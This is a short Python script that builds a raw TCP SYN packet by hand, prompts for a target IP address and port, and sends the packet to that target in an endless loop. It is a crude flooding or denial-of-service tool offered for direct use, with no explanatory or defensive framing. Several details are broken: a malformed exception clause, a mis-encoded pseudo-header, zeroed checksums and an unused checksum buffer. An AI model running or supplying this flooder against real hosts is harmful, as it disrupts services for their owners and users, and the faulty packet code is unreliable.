
import socket, sys
from struct import *
 

 
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
except (socket.error ,msg):
    print ('Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
    sys.exit()
 

def makePacket():
    sourceIp = '127.0.0.1'
    destIp = '127.0.0.1'
    ipIhl = 5
    ipVer = 4
    ipTos = 0
    ipTotLen = 0  
    ipId = 54321   
    ipFragOff = 0
    ipTtl = 255
    ipProto = socket.IPPROTO_TCP
    ipCheck = 0    
    ipSaddr = socket.inet_aton ( sourceIp )   
    ipDaddr = socket.inet_aton ( destIp ) 
    ipIhlVer = (ipVer << 4) + ipIhl
    ipHeader = pack('!BBHHHBBH4s4s' , ipIhlVer,  ipTos,  ipTotLen,  ipId,  ipFragOff , ipTtl, ipProto, ipCheck, ipSaddr, ipDaddr)

    tcpSource = 4567   # source port   
    tcpDest = 3000   # destination port
    tcpSeq = 454
    tcpAckSeq = 0
    tcpDoff = 5    
    tcpFin = 0
    tcpSyn = 1 
    tcpRst = 0
    tcpPsh = 0
    tcpAck = 0
    tcpUrg = 0
    tcpWindow = socket.htons (5840)    
    tcpCheck = 0
    tcpUrg_ptr = 0
    tcpOffsetRes = (tcpDoff << 4) + 0
    tcpFlags = tcpFin + (tcpSyn << 1) + (tcpRst << 2) + (tcpPsh <<3) + (tcpAck << 4) + (tcpUrg << 5)
    tcpHeader = pack('!HHLLBBHHH' , tcpSource,tcpDest, tcpSeq, tcpAckSeq, tcpOffsetRes, tcpFlags,  tcpWindow, tcpCheck, tcpUrg_ptr)
    userData = 'just a normal packet'
    sourceAddress = socket.inet_aton( sourceIp )
    destAddress = destIp.encode()
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcpLength = len(tcpHeader) + len(userData)
    psh = pack('!4s4sBBH' , sourceAddress , destAddress , placeholder , protocol , tcpLength);
    psh = psh + tcpHeader ;
    tcpHeader = pack('!HHLLBBH' , tcpSource,tcpDest, tcpSeq, tcpAckSeq, tcpOffsetRes, tcpFlags,  tcpWindow) + pack('H' , tcpCheck) + pack('!H' , tcpUrg_ptr)    
    
    packet = '';
    packet = ipHeader + tcpHeader
    
    return packet
    
pack = makePacket()    
dest = input("enter ip address of target machine....   ")
port = int(input("enter port number"))
while True:
    s.sendto(pack, (dest , port ))
    print("sending....." , pack)   